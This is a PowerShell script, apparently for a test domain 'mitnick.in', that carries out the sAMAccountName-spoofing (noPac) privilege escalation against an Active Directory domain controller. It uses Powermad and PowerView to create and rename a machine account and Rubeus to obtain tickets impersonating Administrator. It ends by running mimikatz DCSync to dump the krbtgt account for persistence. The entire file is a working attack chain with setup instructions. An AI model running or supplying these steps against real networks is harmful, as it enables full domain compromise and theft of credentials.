# Important Note: copy mimikatz.exe(64 bit), Powermad.ps1, Rubeus.exe, PowerView.ps1 in Downloads Folder
# Review the Domain Controller Name; Domain Name in all steps
# Keep this script on a folder and run it as unelevated powershell

#region Preparations
klist purge
. "$($env:USERPROFILE)\Downloads\Powermad.ps1"
. "$($env:USERPROFILE)\Downloads\PowerView.ps1"
#endregion

#region create a computer account
Write-Output "Create a new Computer Account"
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $password -Domain "mitnick.in" -DomainController "MNDC.mitnick.in" -Verbose
#endregion

#region Remove ServicePrincipalName attribute
Write-Output "Clear SPN from Computer Account object"
Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=MITNICK,DC=IN" -Clear 'serviceprincipalname' -Server MNDC.mitnick.in -Domain mitnick.in -Verbose
#endregion

#region Change SamAccountName
Write-Output "Rename SamAccountName to DC"
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "MNDC" -Attribute samaccountname -Domain mitnick.in -DomainController MNDC.mitnick.in -Verbose
#endregion

#region Obtain a TGT
Write-Output "Obtain TGT from DC01 using password from created computer object"
. "$($env:USERPROFILE)\Downloads\Rubeus.exe" asktgt /user:"MNDC" /password:"ComputerPassword" /domain:"mitnick.in" /dc:"MNDC.mitnick.in" /outfile:kerberos.tgt.kirbi
#endregion

#region Change SamAccountName back
Write-Output "Rename SamAccountName back to ControlledComputer`$"
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer$" -Attribute samaccountname -Domain mitnick.in -DomainController MNDC.mitnick.in -Verbose
#endregion

#region Obtain TGS for CIFS access
Write-Output "Get TGS for CIFS/DC01"
. "$($env:USERPROFILE)\Downloads\Rubeus.exe" s4u /self /impersonateuser:"Administrator" /altservice:"cifs/MNDC.mitnick.in" /dc:"MNDC.mitnick.in" /ptt /ticket:kerberos.tgt.kirbi
#endregion

#region Verify access
Write-Output "Check file access to DC01"
Get-Childitem \\MNDC.mitnick.in\c$
#endregion

#region DCSync krbtgt for persistence
Write-Output "Get TGS for LDAP/DC01"
. "$($env:USERPROFILE)\Downloads\Rubeus.exe" s4u /self /impersonateuser:"Alice" /altservice:"ldap/MNDC.mitnick.in" /dc:"MNDC.mitnick.in" /ptt /ticket:kerberos.tgt.kirbi
Write-Output "Use mimikatz to do a dcsync for account krbtgt to establish persistence"
. "$($env:USERPROFILE)\Downloads\mimikatz.exe" "kerberos::list" "lsadump::dcsync /domain:mitnick.in /kdc:MNDC.mitnick.in /user:krbtgt"
#endregion